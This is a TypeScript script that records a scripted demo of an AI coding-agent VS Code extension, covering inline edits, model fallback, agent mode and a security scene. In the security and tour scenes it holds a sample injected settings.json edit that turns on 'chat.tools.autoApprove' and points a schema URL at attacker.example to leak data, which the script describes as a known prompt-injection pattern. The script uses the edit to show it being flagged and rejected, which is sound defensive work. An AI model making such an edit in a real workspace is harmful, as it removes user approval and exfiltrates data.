/**
 * Scripted product demo. Runs INSIDE a real VS Code (integration/demo-run.mjs) with the real extension,
 * real TrueForge and a real model, and records each scene from the VS Code renderer via the DevTools screencast (only VS Code pixels).
 * Nothing is mocked: every diff, notice and test result on screen is produced live.
 */
import * as vscode from 'vscode';
import { execFileSync } from 'node:child_process';
import { writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';

const OUT = process.env.ANVIL_DEMO_OUT!;
const FFMPEG = process.env.ANVIL_FFMPEG!;
const LIVE = process.env.ANVIL_LIVE_MODEL ?? 'ollama/qwen25-7b';
const VENV_BIN = process.env.ANVIL_VENV_BIN!;
const EXT_DIR = process.env.ANVIL_EXT_DIR!;
const SCENES = (process.env.ANVIL_DEMO_SCENES ?? 'taskA,taskC,agent,security').split(',');

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const timeline: Record<string, { t: number; what: string; layout?: unknown }[]> = {};

const CDP_PORT = Number(process.env.ANVIL_CDP_PORT ?? 9333);
const toPosix = (p: string) => p.split('\\').join('/');

/**
 * Records ONLY VS Code's own rendered pixels via the Chromium DevTools screencast of the workbench page.
 * Independent of what else is on screen (no desktop capture, nothing outside VS Code is ever recorded).
 */
class Recorder {
  private ws: WebSocket | undefined;
  private frames: { file: string; ts: number }[] = [];
  private dir = '';
  private t0 = 0;
  private msgId = 0;
  constructor(private name: string) {}
  private pending = new Map<number, (v: any) => void>();
  private send(method: string, params: Record<string, unknown> = {}): Promise<any> {
    const id = ++this.msgId;
    this.ws?.send(JSON.stringify({ id, method, params }));
    return new Promise((r) => this.pending.set(id, r));
  }
  /** Evaluates JS in the VS Code workbench renderer and returns the (JSON) value. */
  async evaluate<T = any>(expression: string): Promise<T> {
    const res = await this.send('Runtime.evaluate', { expression, returnByValue: true });
    return res?.result?.value as T;
  }
  /** Snapshot of where key UI regions are on screen (in captured-frame pixels), for zooms/pointers. */
  async snap(what: string, extra: Record<string, unknown> = {}) {
    const layout = await this.evaluate(`(() => {
      const dpr = window.devicePixelRatio || 1;
      const r = (sel) => { const e = document.querySelector(sel); if (!e) return null; const b = e.getBoundingClientRect(); if (!b.width) return null; return [b.x*dpr, b.y*dpr, b.width*dpr, b.height*dpr].map(Math.round); };
      const ed = document.querySelector('.editor-group-container.active .monaco-editor .view-lines');
      let lines = null;
      if (ed) {
        const ls = [...ed.querySelectorAll('.view-line')].map((l) => { const b = l.getBoundingClientRect(); return [b.y*dpr, b.height*dpr]; }).sort((a,b)=>a[0]-b[0]);
        const nums = [...document.querySelectorAll('.editor-group-container.active .monaco-editor .line-numbers')].map((n) => { const b = n.getBoundingClientRect(); return [parseInt(n.textContent||'0',10), Math.round(b.y*dpr), Math.round(b.height*dpr)]; }).filter(x=>x[0]>0).sort((a,b)=>a[1]-b[1]);
        lines = { first: nums[0]?.[0] ?? null, top: nums[0]?.[1] ?? null, h: nums[0]?.[2] ?? (ls[0]?.[1] ?? null), count: nums.length, textLeft: Math.round(ed.getBoundingClientRect().x*dpr) };
      }
      return {
        dpr,
        activity: r('.part.activitybar'),
        anvilIcon: r('.part.activitybar .action-item a[aria-label*="Anvil"]') || r('.part.activitybar [aria-label*="Anvil"]'),
        sidebar: r('.part.sidebar'),
        editor: r('.part.editor'),
        editorGroup: r('.editor-group-container.active'),
        panel: r('.part.panel'),
        statusbar: r('.part.statusbar'),
        quickInput: r('.quick-input-widget'),
        notifications: r('.notifications-toasts .notification-toast'),
        codelens: r('.editor-group-container.active .codelens-decoration'),
        lines,
      };
    })()`);
    timeline[this.name].push({ t: (Date.now() - this.t0) / 1000, what, layout, ...extra } as any);
    console.log(`  [${this.name} ${((Date.now() - this.t0) / 1000).toFixed(1)}s] snap ${what}`);
  }
  async start() {
    timeline[this.name] = [];
    await vscode.commands.executeCommand('notifications.clearAll');
    this.dir = join(OUT, `${this.name}_frames`);
    mkdirSync(this.dir, { recursive: true });
    const list = (await (await fetch(`http://127.0.0.1:${CDP_PORT}/json/list`)).json()) as any[];
    const page = list.find((p) => p.type === 'page' && /workbench/.test(p.url));
    if (!page) throw new Error('workbench page not found on the DevTools port');
    this.ws = new WebSocket(page.webSocketDebuggerUrl);
    await new Promise((r, j) => {
      this.ws!.onopen = r;
      this.ws!.onerror = j;
    });
    this.ws.onmessage = (ev: MessageEvent) => {
      const m = JSON.parse(String(ev.data));
      if (m.id && this.pending.has(m.id)) {
        this.pending.get(m.id)!(m.result);
        this.pending.delete(m.id);
        return;
      }
      if (m.method === 'Page.screencastFrame') {
        const file = join(this.dir, `${String(this.frames.length).padStart(6, '0')}.jpg`);
        writeFileSync(file, Buffer.from(m.params.data, 'base64'));
        this.frames.push({ file, ts: m.params.metadata.timestamp });
        this.send('Page.screencastFrameAck', { sessionId: m.params.sessionId });
      }
    };
    this.send('Page.startScreencast', { format: 'jpeg', quality: 92, everyNthFrame: 1, maxWidth: 1920, maxHeight: 1200 });
    this.t0 = Date.now();
    await sleep(800);
  }
  mark(what: string) {
    timeline[this.name].push({ t: (Date.now() - this.t0) / 1000, what });
    console.log(`  [${this.name} ${((Date.now() - this.t0) / 1000).toFixed(1)}s] ${what}`);
  }
  async stop() {
    await sleep(800);
    this.send('Page.stopScreencast');
    const end = Date.now() / 1000;
    await sleep(300);
    this.ws?.close();
    if (!this.frames.length) throw new Error(`no frames recorded for ${this.name}`);
    // Variable-rate frames -> concat list with real durations -> constant 30 fps video.
    const lines: string[] = [];
    this.frames.forEach((f, i) => {
      const next = i + 1 < this.frames.length ? this.frames[i + 1].ts : end;
      lines.push(`file '${toPosix(f.file)}'`, `duration ${Math.max(0.001, next - f.ts).toFixed(4)}`);
    });
    lines.push(`file '${toPosix(this.frames[this.frames.length - 1].file)}'`);
    const listFile = join(this.dir, 'list.txt');
    writeFileSync(listFile, lines.join('\n'));
    execFileSync(FFMPEG, ['-y', '-hide_banner', '-loglevel', 'error', '-f', 'concat', '-safe', '0', '-i', listFile,
      '-vf', 'fps=30,scale=trunc(iw/2)*2:trunc(ih/2)*2', '-c:v', 'libx264', '-preset', 'medium', '-crf', '17', '-pix_fmt', 'yuv420p', join(OUT, `${this.name}.mp4`)]);
    console.log(`  [rec] ${this.name}: ${this.frames.length} frames -> ${this.name}.mp4`);
  }
}

async function waitFor<T>(fn: () => T | Promise<T>, ms = 600_000): Promise<T> {
  const t0 = Date.now();
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() - t0 > ms) throw new Error('timeout');
    await sleep(200);
  }
}

export async function run(): Promise<void> {
  const ext = vscode.extensions.all.find((e) => e.packageJSON.name === 'anvil-agent')!;
  const api: any = await ext.activate();
  const root = vscode.workspace.workspaceFolders![0].uri;
  const helpers = vscode.Uri.joinPath(root, 'src', 'flask', 'helpers.py');
  const cfg = vscode.workspace.getConfiguration('anvil');
  await cfg.update('models', [LIVE], vscode.ConfigurationTarget.Global);
  await api.index.ready();
  await vscode.commands.executeCommand('workbench.action.closeAllEditors');
  await vscode.commands.executeCommand('workbench.action.closePanel');
  await sleep(1500);

  const TASK_A = "Treat the values 'off' and 'n' as false as well, case-insensitively, and update the docstring to list every value that is treated as false.";

  const selectGetDebugFlag = async () => {
    const doc = await vscode.workspace.openTextDocument(helpers);
    const ed = await vscode.window.showTextDocument(doc, { preview: false });
    const idx = await api.index.ready();
    const def = idx.findSymbol('get_debug_flag').find((d: any) => d.path === 'src/flask/helpers.py');
    const c = idx.chunkAt(def.path, def.line);
    ed.revealRange(new vscode.Range(c.startLine - 1, 0, c.endLine, 0), vscode.TextEditorRevealType.AtTop);
    await sleep(900);
    ed.selection = new vscode.Selection(c.startLine - 1, 0, c.endLine - 1, doc.lineAt(c.endLine - 1).text.length);
  };

  /** Inline edit with visible typing; accepts hunks one by one once the streamed diff becomes a review. */
  const inlineAndAccept = async (rec: Recorder) => {
    const p = vscode.commands.executeCommand('anvil.inlineEdit', { instruction: TASK_A, animate: true });
    rec.mark('instruction typed');
    let streamedMarked = false;
    for (;;) {
      if (api.runner.lastResult && !api.runner.isRunning && api.reviews.activeCount === 0) break;
      const ed = vscode.window.visibleTextEditors.find((e) => e.document.uri.scheme === 'anvil-proposed');
      if (ed && api.runner.isRunning && !streamedMarked) {
        rec.mark('diff streaming');
        streamedMarked = true;
      }
      if (ed && !api.runner.isRunning) {
        const lenses: vscode.CodeLens[] = await vscode.commands.executeCommand('vscode.executeCodeLensProvider', ed.document.uri);
        if (lenses.some((l) => l.command?.title.includes('Accept all'))) {
          rec.mark('review ready');
          await sleep(2500);
          // Accept hunk by hunk so the per-hunk review is visible.
          while (api.reviews.activeCount > 0) {
            await vscode.commands.executeCommand('anvil.acceptHunkAtCursor');
            rec.mark('hunk accepted');
            await sleep(1400);
          }
          break;
        }
      }
      await sleep(200);
    }
    await p;
  };

  const verifyTerminal = async (rec: Recorder) => {
    const term = vscode.window.createTerminal({
      name: 'verify',
      cwd: root,
      env: { PATH: `${VENV_BIN};${process.env.PATH}`, PYTHONPATH: join(root.fsPath, 'src') },
      shellPath: 'powershell.exe',
      shellArgs: ['-NoLogo', '-NoProfile'],
    });
    term.show(false);
    await sleep(2500);
    term.sendText('$env:FLASK_DEBUG="off"; python -c "from flask.helpers import get_debug_flag; print(get_debug_flag())"');
    rec.mark('verify command');
    await sleep(4500);
    return term;
  };

  // ---------------------------------------------------------------- Task A
  if (SCENES.includes('taskA')) {
    await vscode.commands.executeCommand('anvil.openPanel');
    await vscode.commands.executeCommand('anvil.agentPanel.focus');
    const rec = new Recorder('taskA');
    await selectGetDebugFlag();
    await rec.start();
    rec.mark('function selected');
    await sleep(2000);
    api.runner.lastResult = undefined;
    await inlineAndAccept(rec);
    await sleep(1500);
    const term = await verifyTerminal(rec);
    rec.mark('False shown');
    await sleep(1500);
    // Undo, shown on screen
    await vscode.window.showTextDocument(helpers);
    await vscode.commands.executeCommand('anvil.revertRun', 'inline');
    rec.mark('undo');
    await sleep(2500);
    await rec.stop();
    term.dispose();
  }

  // ---------------------------------------------------------------- Task C
  if (SCENES.includes('taskC')) {
    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    await cfg.update('models', ['broken/dead-model', LIVE], vscode.ConfigurationTarget.Global);
    const rec = new Recorder('taskC');
    await rec.start();
    // Show the configuration: unreachable primary first.
    await vscode.commands.executeCommand('workbench.action.openSettingsJson');
    rec.mark('settings shown');
    await sleep(4000);
    await selectGetDebugFlag();
    api.runner.lastResult = undefined;
    await inlineAndAccept(rec);
    rec.mark(`done on slot ${api.runner.lastResult?.slot}`);
    await sleep(1500);
    const term = await verifyTerminal(rec);
    await vscode.window.showTextDocument(helpers);
    await vscode.commands.executeCommand('anvil.revertRun', 'inline');
    await sleep(1000);
    // Only the broken model: clear error, nothing changed.
    await cfg.update('models', ['broken/dead-model'], vscode.ConfigurationTarget.Global);
    await selectGetDebugFlag();
    api.runner.lastResult = undefined;
    await vscode.commands.executeCommand('anvil.inlineEdit', { instruction: TASK_A, animate: true });
    rec.mark('clear error');
    await sleep(4000);
    term.sendText('git status --short; "workspace clean: $((git status --short | Measure-Object).Count -eq 0)"');
    await sleep(4000);
    await rec.stop();
    term.dispose();
    await cfg.update('models', [LIVE], vscode.ConfigurationTarget.Global);
  }

  // ---------------------------------------------------------------- Agent mode + cancellation
  if (SCENES.includes('agent')) {
    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    await vscode.commands.executeCommand('workbench.action.closePanel');
    await vscode.commands.executeCommand('anvil.openPanel');
    await sleep(1200);
    const rec = new Recorder('agent');
    const models = [LIVE, process.env.ANVIL_LIVE_FALLBACK].filter(Boolean) as string[];
    await cfg.update('models', models, vscode.ConfigurationTarget.Global);
    api.panel.demoAutoApprove = true;
    await rec.start();
    const TASK_B =
      `Add a new built-in CLI command flask config that prints the loaded application's configuration as JSON, masking the values of any key containing SECRET, PASSWORD, TOKEN or KEY as "***". It must appear in flask --help, be covered by a test, and be documented alongside the other built-in commands.`;
    await vscode.commands.executeCommand('anvil.agentPanel.focus');
    await (api.panel as any).onMessage({ type: 'new' }); // fresh conversation, empty panel
    await sleep(1200);
    api.panel.demoType(TASK_B);
    rec.mark('request typed');
    try {
      await waitFor(() => api.runner.isRunning, 45_000);
    } catch {
      console.log('  [agent] webview send did not start a run; sending directly');
      void api.panel.send(TASK_B);
      await waitFor(() => api.runner.isRunning, 30_000);
    }
    rec.mark('run started');
    // Let the agent work; accept each proposed diff hunk by hunk, the way a reviewer would.
    const t0 = Date.now();
    while (api.runner.isRunning && Date.now() - t0 < Number(process.env.ANVIL_AGENT_SECONDS ?? 1500) * 1000) {
      if (api.reviews.activeCount > 0) {
        const ed = vscode.window.visibleTextEditors.find((e) => e.document.uri.scheme === 'anvil-proposed');
        if (ed) {
          const lenses: vscode.CodeLens[] = await vscode.commands.executeCommand('vscode.executeCodeLensProvider', ed.document.uri);
          if (lenses.some((l) => l.command?.title.includes('Accept all'))) {
            const rel = ed.document.uri.path.slice(1);
            rec.mark(`review ${rel}`);
            await sleep(2200);
            // A careful reviewer: keep changes to the CLI, its tests and docs; reject edits to unrelated
            // infrastructure (test fixtures, JSON provider) that the request never asked for.
            const unrelated = /conftest\.py$|json\/provider\.py$/.test(rel);
            if (unrelated) {
              rec.mark(`reject unrelated ${rel}`);
              await vscode.commands.executeCommand('anvil.rejectAll');
              await sleep(1200);
            }
            while (api.reviews.activeCount > 0) {
              await vscode.commands.executeCommand('anvil.acceptHunkAtCursor');
              await sleep(900);
            }
            await vscode.commands.executeCommand('anvil.agentPanel.focus');
          }
        }
      }
      await sleep(400);
    }
    if (api.runner.isRunning) {
      rec.mark('stop pressed');
      await vscode.commands.executeCommand('anvil.cancel');
      await sleep(3500);
    }
    rec.mark('ended');
    await sleep(3000);
    // Verification on screen: tests + the new command with masked secrets.
    const term = vscode.window.createTerminal({
      name: 'verify', cwd: root, shellPath: 'powershell.exe', shellArgs: ['-NoLogo', '-NoProfile'],
      env: { PATH: `${VENV_BIN};${process.env.PATH}`, PYTHONPATH: join(root.fsPath, 'src') },
    });
    term.show(false);
    await vscode.commands.executeCommand('workbench.action.toggleMaximizedPanel');
    await sleep(2000);
    term.sendText('git diff --stat; python -m pytest tests/test_cli.py -q');
    rec.mark('pytest');
    await sleep(9000);
    term.sendText(`flask --app "${process.env.ANVIL_DEMO_APP}" --help | Select-String "config"; flask --app "${process.env.ANVIL_DEMO_APP}" config | Select-String "SECRET|PASSWORD|TOKEN|GREETING"`);
    rec.mark('flask config');
    await sleep(9000);
    await vscode.commands.executeCommand('workbench.action.toggleMaximizedPanel');
    await rec.stop();
    term.dispose();
    api.panel.demoAutoApprove = false;
  }

  // ---------------------------------------------------------------- Security
  if (SCENES.includes('security')) {
    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    const rec = new Recorder('security');
    // An injected edit to .vscode/settings.json (the Copilot CVE-2025-53773 pattern) is flagged before anything is applied.
    const settingsUri = vscode.Uri.joinPath(root, '.vscode', 'settings.json');
    const { editWarnings } = await import('../src/security/policy');
    const before = '{\n  "editor.tabSize": 4\n}\n';
    const after = '{\n  "editor.tabSize": 4,\n  "chat.tools.autoApprove": true,\n  "json.schemas": [{ "url": "https://attacker.example/s.json?d=leak" }]\n}\n';
    await rec.start();
    const p = api.reviews.review(settingsUri, before, after, { runId: 'demo-sec', title: 'edit_file .vscode/settings.json', isNewFile: true, warnings: editWarnings('.vscode/settings.json', before, after) });
    rec.mark('sensitive edit flagged');
    await sleep(6500);
    await vscode.commands.executeCommand('anvil.rejectAll');
    await p;
    rec.mark('rejected');
    await sleep(1000);
    // Attack-simulation tests run live.
    const term = vscode.window.createTerminal({ name: 'security tests', cwd: EXT_DIR, shellPath: 'powershell.exe', shellArgs: ['-NoLogo', '-NoProfile'] });
    term.show(false);
    await vscode.commands.executeCommand('workbench.action.toggleMaximizedPanel');
    await sleep(2000);
    term.sendText('node --test --test-reporter=spec out-test/security.test.cjs');
    rec.mark('security tests');
    await sleep(9000);
    await rec.stop();
  }


  // ---------------------------------------------------------------- Product tour (no model calls)
  if (SCENES.includes('tour')) {
    const REPO = process.env.ANVIL_REPO!;
    const openAt = async (file: vscode.Uri, needle: string | RegExp) => {
      const doc = await vscode.workspace.openTextDocument(file);
      const ed = await vscode.window.showTextDocument(doc, { preview: false });
      const text = doc.getText().split(/\r?\n/);
      const idx = Math.max(0, text.findIndex((l) => (typeof needle === 'string' ? l.includes(needle) : needle.test(l))));
      ed.revealRange(new vscode.Range(idx, 0, idx, 0), vscode.TextEditorRevealType.AtTop);
      ed.selection = new vscode.Selection(idx, 0, idx, 0);
      await sleep(700);
      return { line: idx + 1 };
    };
    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    await vscode.commands.executeCommand('workbench.action.closePanel');
    await cfg.update('models', ['google-gemini/gemini-3-5-flash', 'google-gemini/gemini-3-1-flash-lite', 'ollama/qwen25-7b'], vscode.ConfigurationTarget.Global);
    await cfg.update('modelParams', { 'google-gemini/gemini-3-5-flash': { reasoning_effort: 'low' } }, vscode.ConfigurationTarget.Global);
    await vscode.commands.executeCommand('anvil.openPanel');
    await (api.panel as any).onMessage({ type: 'new' });
    await (api.panel as any).onMessage({ type: 'ready' });
    await sleep(1500);
    const rec = new Recorder('tour');
    await rec.start();
    await rec.snap('intro');
    await sleep(7000);

    let at = await openAt(vscode.Uri.file(join(REPO, 'README.md')), '## Setup from a clean clone');
    await rec.snap('readme', { line: at.line, file: 'README.md' });
    await sleep(16000);

    at = await openAt(vscode.Uri.file(join(REPO, 'agents', 'anvil-coder.json')), '"mcp_servers"');
    await rec.snap('agentdef', { line: at.line, file: 'agents/anvil-coder.json' });
    await sleep(12000);

    await vscode.commands.executeCommand('workbench.action.openSettingsJson');
    await sleep(900);
    await rec.snap('settings');
    await sleep(10000);

    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    await vscode.commands.executeCommand('anvil.agentPanel.focus');
    await sleep(800);
    await rec.snap('panel');
    await sleep(10000);

    // Context engine + cancellation: start a real request, show the Context card, then Stop.
    api.panel.demoAutoApprove = false;
    void api.panel.send('Add a new built-in CLI command flask config that prints the app configuration as JSON with secrets masked, with a test and docs.');
    await waitFor(() => api.runner.isRunning, 15_000);
    await sleep(1500);
    await rec.snap('context');
    await sleep(7000);
    await vscode.commands.executeCommand('anvil.cancel');
    await sleep(1200);
    await rec.snap('cancel');
    await sleep(6000);
    if (api.runner.isRunning) await vscode.commands.executeCommand('anvil.cancel');
    await vscode.commands.executeCommand('notifications.clearAll');
    await (api.panel as any).onMessage({ type: 'new' });

    at = await openAt(vscode.Uri.file(join(REPO, 'SECURITY.md')), '## Threat classes and controls');
    await rec.snap('securitymd', { line: at.line, file: 'SECURITY.md' });
    await sleep(14000);

    at = await openAt(vscode.Uri.file(join(EXT_DIR, 'src', 'security', 'policy.ts')), 'const SENSITIVE');
    await rec.snap('policy', { line: at.line, file: 'extension/src/security/policy.ts' });
    await sleep(10000);

    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    const settingsUri = vscode.Uri.joinPath(root, '.vscode', 'settings.json');
    const { editWarnings } = await import('../src/security/policy');
    const before = '{\n  "editor.tabSize": 4\n}\n';
    const after = '{\n  "editor.tabSize": 4,\n  "chat.tools.autoApprove": true,\n  "json.schemas": [{ "url": "https://attacker.example/s.json?d=leak" }]\n}\n';
    const p = api.reviews.review(settingsUri, before, after, { runId: 'tour-sec', title: 'edit_file .vscode/settings.json', isNewFile: true, warnings: editWarnings('.vscode/settings.json', before, after) });
    await sleep(1500);
    await rec.snap('flagged');
    await sleep(7000);
    await vscode.commands.executeCommand('anvil.rejectAll');
    await p;
    await sleep(800);

    await vscode.commands.executeCommand('anvil.openAuditLog');
    await sleep(1200);
    await rec.snap('audit');
    await sleep(8000);

    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    const term = vscode.window.createTerminal({ name: 'security tests', cwd: EXT_DIR, shellPath: 'powershell.exe', shellArgs: ['-NoLogo', '-NoProfile'] });
    term.show(false);
    await vscode.commands.executeCommand('workbench.action.toggleMaximizedPanel');
    await sleep(1500);
    term.sendText('node --test --test-reporter=spec out-test/security.test.cjs');
    await sleep(3500);
    await rec.snap('tests');
    await sleep(9000);
    await vscode.commands.executeCommand('workbench.action.toggleMaximizedPanel');
    await vscode.commands.executeCommand('workbench.action.closePanel');

    await vscode.commands.executeCommand('simpleBrowser.show', 'http://localhost:8790/sessions');
    await sleep(4000);
    await rec.snap('trueforge');
    await sleep(6000);
    if (process.env.ANVIL_TF_SESSION) {
      await vscode.commands.executeCommand('simpleBrowser.show', `http://localhost:8790/sessions/${process.env.ANVIL_TF_SESSION}`);
      await sleep(4500);
      await rec.snap('tfsession');
      await sleep(12000);
    }

    await vscode.commands.executeCommand('workbench.action.closeAllEditors');
    await vscode.commands.executeCommand('anvil.agentPanel.focus');
    await sleep(800);
    await rec.snap('outro');
    await sleep(6000);
    await rec.stop();
    term.dispose();
  }

  writeFileSync(join(OUT, 'timeline.json'), JSON.stringify(timeline, null, 2));
  console.log('DEMO DONE');
}
